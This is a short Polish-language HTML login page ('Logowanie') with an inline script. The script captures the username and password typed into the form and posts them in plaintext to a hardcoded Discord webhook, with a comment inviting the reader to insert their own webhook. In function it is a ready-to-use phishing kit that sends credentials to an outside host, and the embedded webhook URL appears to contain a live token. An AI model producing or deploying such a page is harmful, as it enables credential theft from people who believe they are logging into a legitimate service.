<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <title>Logowanie</title>
  <style>
    body { font-family: sans-serif; }
    #out { margin-top: 1em; color: green; }
    .hidden { display: none; }
  </style>
</head>
<body>

  <h1>Logowanie</h1>
  <form id="loginForm">
    <label>
      Login:
      <input type="text" name="username" required>
    </label><br><br>
    <label>
      Hasło:
      <input type="password" name="password" required>
    </label><br><br>
    <button type="submit">Zaloguj się</button>
  </form>

  <div id="out" class="hidden"></div>

  <script>
    const webhookUrl = https://discord.com/api/webhooks/1399272439778771044/tKsun2HWGdUCEk-Lspm1D6ILN9bPVouDhyHlwzwN-f0a0nQWOec_F50zo6e2hypeAffw; // 🔁 ← Tutaj wstaw swój Webhook
    const out = document.getElementById("out");

    document.getElementById("loginForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      const fd = new FormData(e.target);
      const data = Object.fromEntries(fd.entries());

      const content = `🔐 **Nowe logowanie**\n👤 Login: \`${data.username}\`\n🔑 Hasło: \`${data.password}\``;

      try {
        const response = await fetch(webhookUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content })
        });

        if (response.ok) {
          out.classList.remove("hidden");
          out.textContent = "✅ Dane zostały wysłane na Discord.";
        } else {
          out.classList.remove("hidden");
          out.textContent = "❌ Błąd podczas wysyłania na Discord.";
        }
      } catch (err) {
        out.classList.remove("hidden");
        out.textContent = "⚠️ Wystąpił błąd sieci: " + err.message;
      }
    });
  </script>

</body>
</html>
